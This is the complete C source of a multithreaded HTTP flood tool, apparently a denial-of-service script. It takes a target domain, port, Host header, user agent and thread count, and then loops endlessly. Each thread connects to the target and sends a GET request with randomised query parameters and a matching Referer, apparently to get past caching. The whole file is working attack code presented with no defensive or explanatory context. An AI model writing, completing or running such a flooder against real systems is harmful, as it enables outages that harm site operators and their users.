#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>

char *charset = "abcdefghijqlmnopqrstuvwxyzABCDEFGHIJQLMNOPQRSTUVWXYZ1234567890";
char *tgtip;
char *hosthdr;
char *useragent;
int port;
struct timeval tv;
struct sockaddr_in sa; 

int makesa() {
 struct hostent *host;
 if(host = gethostbyname(tgtip)) {
  sa.sin_addr.s_addr = *((unsigned int *)host->h_addr);
  sa.sin_port = htons(port); 
  sa.sin_family = AF_INET;
 } else {
  dprintf(1, "invalid domain/ip\n");
  exit(0);
 }
}

char *randomize_req() {
 char *req = malloc(2048); 
 memset(req, 0, 2048);
 char rand1[64], rand2[64];
 int randnum1, randnum2, a, b;
 randnum1 = random() % (64 - 4) + 4;
 randnum2 = random() % (64 - 4) + 4;
 memset(rand1, 0, 64);
 for(int i = 0; i < randnum1; i++) {
  a = random() % (strlen(charset) - 0) + 0;
  rand1[i] = charset[a];
 }
 memset(rand2, 0, 64);
 for(int i = 0; i < randnum2; i++) {
  b = random() % (strlen(charset) - 0) + 0;
  rand2[i] = charset[b];
 }
 sprintf(req, "GET /?%s=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip\r\nReferer: http://%s/?%s=%s\r\n\r\n", rand1, rand2, hosthdr, useragent, hosthdr, rand1, rand2);
 memset(rand1, 0, 64);
 memset(rand2, 0, 64);
 return req;
}

void *dosg(void *unused) {
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  char *req = randomize_req();
  send(fd, req, strlen(req), 0); 
  free(req);
 }
 close(fd);
}

int make_threads(int threadnum) {
 pthread_t threadg[threadnum];
 makesa();
 while(1) {
  for(int i = 0; i < threadnum; i++) {
   pthread_create(&threadg[i], 0, &dosg, 0);
  }
  for(int i = 0; i < threadnum; i++) {
   pthread_join(threadg[i], 0);
  }
 } 
}

int main(int argc, char **argv) {
 tv.tv_sec = 1;
 srandom(time(0));
 if(argc < 6) {
  dprintf(1, "domain port host useragent threads\n");
  return 0;
 }
 tgtip = argv[1];
 port = atoi(argv[2]);
 hosthdr = argv[3];
 useragent = argv[4];
 make_threads(atoi(argv[5]));
}
